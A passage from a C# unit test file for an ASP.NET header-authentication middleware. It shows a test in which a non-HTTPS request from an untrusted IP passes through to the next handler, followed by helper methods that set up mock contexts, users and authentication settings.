        context.Request.IsHttps = false; // Not HTTPS
        context.Connection.RemoteIpAddress = IPAddress.Parse("8.8.8.8"); // Untrusted IP

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };
        headerAuthSettings.RequireHttps = true;
        headerAuthSettings.MaxHeaderLength = 256;

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    #endregion

    #region Helper Methods

    private HttpContext CreateHttpContext()
    {
        var context = new DefaultHttpContext();
        context.Request.Scheme = "http";
        context.Request.IsHttps = false;
        context.Connection.RemoteIpAddress = IPAddress.Parse("127.0.0.1");
        return context;
    }

    private ClaimsPrincipal CreateAuthenticatedUser()
    {
        var identity = new ClaimsIdentity("TestAuth");
        identity.AddClaim(new Claim(ClaimTypes.Name, "testuser"));
        return new ClaimsPrincipal(identity);
    }

    private AppUser CreateTestUser()
    {
        return new AppUser
        {
            Id = TEST_USER_ID,
            UserName = TEST_USERNAME,
            Email = TEST_EMAIL,
        };
    }

    private void SetupMocks()
    {
        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["127.0.0.1"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure AutoMock with the required dependencies
        Mock.Mock<IAuthenticationSettings>().Setup(x => x.HeaderAuthentication).Returns(headerAuthSettings);

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(It.IsAny<string>())).ReturnsAsync((AppUser?)null);

        // Configure IdentitySignInService mock in AutoMock
        Mock.Mock<IIdentitySignInService>()
            .Setup(x => x.SignInAsync(It.IsAny<IEnumerable<Claim>>(), It.IsAny<IEnumerable<string>>()))
            .Returns(Task.CompletedTask);
    }

    private void SetupAuthenticationSettings(HeaderAuthenticationSettings headerAuthSettings)
    {
        Mock.Mock<IAuthenticationSettings>().Setup(x => x.HeaderAuthentication).Returns(headerAuthSettings);

        // Ensure IIdentitySignInService is always mocked for tests that might reach authentication
        Mock.Mock<IIdentitySignInService>()
            .Setup(x => x.SignInAsync(It.IsAny<IEnumerable<Claim>>(), It.IsAny<IEnumerable<string>>()))
            .Returns(Task.CompletedTask);
    }

    #endregion
}